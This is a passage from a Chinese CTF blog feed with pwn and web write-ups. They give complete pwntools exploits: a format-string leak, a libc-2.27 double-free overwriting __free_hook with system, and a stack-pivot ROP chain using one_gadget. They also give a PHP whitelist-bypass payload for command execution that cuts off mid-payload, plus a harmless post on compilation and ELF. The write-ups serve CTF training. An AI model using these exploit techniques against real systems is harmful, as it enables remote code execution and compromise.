class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑就是之前把flag文件读入内存，然后输入字符串和flag字符串进行对比<br>主函数存在格式化字符串漏洞，我们直接在栈上找到格式化字符串参数的位置，然后直接读出来即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>考点<ol><li>程序调试，栈溢出泄漏地址</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>程序先给了一个输入name和id的东西，发现了格式化字符串但是由于是__printf_chk，所以没找到好的利用点<br>然后下面是输入id，还有个puts，调试发现id后面是有libc函数setbuffer的，又因为是puts函数直接来给他泄漏出来<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>add功能只允许申请0-0x50大小的chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>delete功能存在UAF<br>在老版的libc-2.27下是允许double free存在的<br>然后直接改__free_hook为system一把梭就行了<br>新版的打完今天的VN再试一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actf栈迁移</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="分析回顾栈迁移"><a href="#分析回顾栈迁移" class="headerlink" title="分析回顾栈迁移"></a>分析回顾栈迁移</h2><p>没有开PIE保护和Canary</p><ul><li>IDA分析结果如下<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>题目给出栈地址，我们可以将栈迁移到栈上，布置gadget泄漏libc地址然后one_gadget一把梭</p><ul><li>栈帧结构如下<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制程序从源文件到可执行程序的过程</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>在c语言中，我们都知道一个源程序从源码到可执行文件都要经历预处理，编译，汇编和链接的过程，最终形成可执行文件，然后才被操作系统装载进内存运行。</p><p>为了复习pwn知识，写个文章来探究一下经常被我忽略的关于程序的中间过程。</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>该过程主要处理源代码中以’#’开始的预编译指令<br>具体处理规则如下：</p><ul><li>删除#define并展开所有的宏定义</li><li>处理所有条件预编译指令：如 “#if”等</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置</li><li>删除注释，添加行号和文件名标识</li></ul><p>预编译的过程可用如下指令来执行 </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>源代码如下：<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>经过预编译后：<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程经过一系列词法分析等步骤生成汇编代码文件，是程序构建的核心部分<br>不同的操作系统有不同的编译器，比如Linux下的gcc，g++，Windows下的MSVCCL等（后文都以Linux平台下来探究）<br>我们可以使用<code>gcc -S BinaryName.i -o BinaryName.s</code>或者<code>gcc -S BinaryName -o BinaryName.s</code>来查看经过编译后的文件</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编过程可以将汇编代码转变为机器可以执行的指令<br><code>gcc -c BinaryName.s -o BinaryName.o</code>或<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>我们先看下c语言源代码中的变量和函数</p><h3 id="c语言源代码中的变量和函数"><a href="#c语言源代码中的变量和函数" class="headerlink" title="c语言源代码中的变量和函数"></a>c语言源代码中的变量和函数</h3><ul><li>声明和定义的区别：<ul><li>声明是告诉编译器该变量没有在当前文件中定义而是在其他文件中定义</li><li>定义变量是告诉编译器在生成的目标文件中留出空间来存放该变量</li><li>定义函数是告诉编译器在目标文件中生成该函数的二进制代码</li></ul></li></ul><p>变量类型如下：</p><ol><li>全局变量：非static，表示该变量的生命周期是整个程序的执行期间，可以被其他文件访问</li><li>全局变量：static，生命周期也是整个程序的执行期间，但是不能被其他文件访问</li><li>局部变量：static，生命周期是程序的执行期间，但是作用域仅在该函数体中</li><li>局部变量：非static，仅存在于当前当前函数体中</li></ol><p>对于函数也同理，如果定义了static则无法被其他文件所读取</p><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>部分段名如下</p><ul><li>.data段保存已经初始化的全局静态变量和局部静态变量</li><li>.rodata段存放的是只读数据，一般是程序里面的只读变量（const修饰的）和字符串常量</li><li>.bss段存放的是未初始化的全局变量和局部静态变量</li><li>.comment存放的是编译器版本信息</li><li>.debug存放调试信息</li><li>.dynamic存放动态链接信息</li><li>.strtab String Table字符串表，用于存放ELF文件中用到的各种字符串</li><li>.symtab Symbol Table符号表</li><li>.plt .got 动态链接的跳转表和全局入口表</li><li>.init 程序初始化段</li><li>.fini 程序终结代码段</li></ul><p>ELF文件头结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF header结构体如下<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="源代码到目标文件的处理"><a href="#源代码到目标文件的处理" class="headerlink" title="源代码到目标文件的处理"></a>源代码到目标文件的处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// 全局static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// 声明函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过nm命令来查看目标文件的符号，从左到右分别是变量的相对地址，变量所在段的名字和变量名字。<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>其中a.1922是编译器修改变量名字的结果，因为a是一个局部静态变量，作用域在他的函数体中，所以当我们在不同的函数体中声明相同名字的局部静态变量（这种操作是被允许的）而且其生命周期为整个程序执行时，编译器为了支持这种功能，所以来加后缀来标识不同的局部静态变量。</p><p>我们还可以用objdump来查看目标文件的结构，-h参数可查看各个段的基本信息</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Size表示段长度<br>File off表示在文件中的偏移<br>每个段第二行中的”CONTENTS” “ALLOC”等表示段的属性，”CONTENTS”表示在文件中存在<br>比如数据段的大小为0xc字节大小，因为有三个四字节的变量分别为globalA,globalC和a</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>使用如下命令来完成链接过程<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>可以看到之前的一些相对地址全部变为了绝对地址，完成了地址重定位</p><h2 id="装载运行"><a href="#装载运行" class="headerlink" title="装载运行"></a>装载运行</h2><p>当程序加载进内存程序即可运行，在这个过程中我们不得不提到虚拟内存，动态链接库和函数执行的问题。我们给出程序执行的顺序，具体探究我们等到之后的文章再另行分析。</p><blockquote><p>  1.首先 bash 进行 fork 系统调用，生成一个子进程，接着在子进程中运行 execve 函数指定的 elf 二进制程序（ Linux中执行二进制程序最终都是通过 execve 这个库函数进行的），execve 会调用系统调用把 elf 文件 load 到内存中的代码段(_text)中。<br>2.如果有依赖的动态链接库，会调用动态链接器进行库文件的地址映射，动态链接库的内存空间是被多个进程共享的。<br>3.内核从 elf 文件头得到_start的地址，调度执行流从_start指向的地址开始执行，执行流在_start执行的代码段中跳转到libc中的公共初始化代码段<strong>libc_start_main，进行程序运行前的初始化工作。<br>4.</strong>libc_start_main的执行过程中，会跳转到_init中全局变量的初始化工作，随后调用我们的main函数，进入到主函数的指令流程。</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>《程序员的自我修养》</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 程序与操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 初赛] Love Math-总结数学中的命令执行</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>开局给了源码 拿到本地分析一下<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>白名单只给了一堆数学函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>从里面找出来能够利用的拼凑出命令执行</p><p>最终肯定希望能够达成这样的结果<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>所以难点在于如何利用已知函数来拼凑出$_POST</p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><ol><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>base_convert — 在任意进制之间转换数字，最高为36进制</li><li>dechex — 十进制转换为十六进制</li></ol><p>利用base_convert凑出来hex2bin,再利用hex2bin凑出来_POST,最后用可变变量完成命令执行</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// 转成_POST字符串的十六进制</span></span><br><span class="line"></span><br><span class="line">以上两个语句合起来为 <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// 中括号被ban,用大括号来绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h2><h3 id="get传入参数命令执行"><a href="#get传入参数命令执行" class="headerlink" title="get传入参数命令执行"></a>get传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span 